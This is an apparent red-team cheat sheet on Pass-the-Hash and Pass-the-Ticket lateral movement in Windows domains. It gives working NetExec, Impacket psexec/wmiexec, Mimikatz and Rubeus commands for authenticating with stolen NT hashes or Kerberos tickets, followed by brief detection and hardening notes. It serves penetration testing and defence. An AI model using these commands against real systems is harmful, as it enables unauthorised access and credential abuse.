---
title: "Pass-the-Hash / Pass-the-Ticket"
category: "red-team"
tags: ["lateral-movement", "credential-access", "kerberos", "ntlm"]
platform: "windows"
mitre: ["T1550.002", "T1550.003"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Pass-the-Hash / Pass-the-Ticket

## TL;DR
You don't need the password — just the NT hash (PtH, NTLM) or a Kerberos ticket (PtT). You authenticate as the victim without cracking the password.

## Pass-the-Hash (NTLM)
```bash
# NetExec / CrackMapExec – run a command remotely
nxc smb 10.10.10.20 -u administrator -H aad3b435b51404eeaad3b435b51404ee:<NThash> -x whoami
# Impacket – interactive shell
impacket-psexec -hashes :<NThash> administrator@10.10.10.20
impacket-wmiexec -hashes :<NThash> administrator@10.10.10.20   # quieter than psexec
```
```powershell
# Mimikatz – sekurlsa PtH (starts a process with the hash)
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NThash> /run:cmd.exe
```

## Pass-the-Ticket (Kerberos)
```powershell
# Import a .kirbi ticket into the current session
Rubeus.exe ptt /ticket:ticket.kirbi
```
```bash
# Linux – use a ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass corp.local/administrator@target.corp.local
```

## Detection (Blue Team)
- Logon type 3 (network) NTLM from a user's host to many machines (Event 4624/4776).
- Kerberos tickets used from a host other than where issued; logon anomalies.
- EDR: `lsass` access (hash theft), remote exec via psexec/wmiexec (7045, 4688).

## Mitigation / Hardening
- Credential Guard, LSASS PPL, restrict local admin logons (LAPS).
- Windows Defender / tiering: Tier 0 accounts only on Tier 0 hosts.
- Enforce Kerberos AES, monitor `psexec`/`wmiexec` signatures.

## Sources
- [MITRE T1550](https://attack.mitre.org/techniques/T1550/)
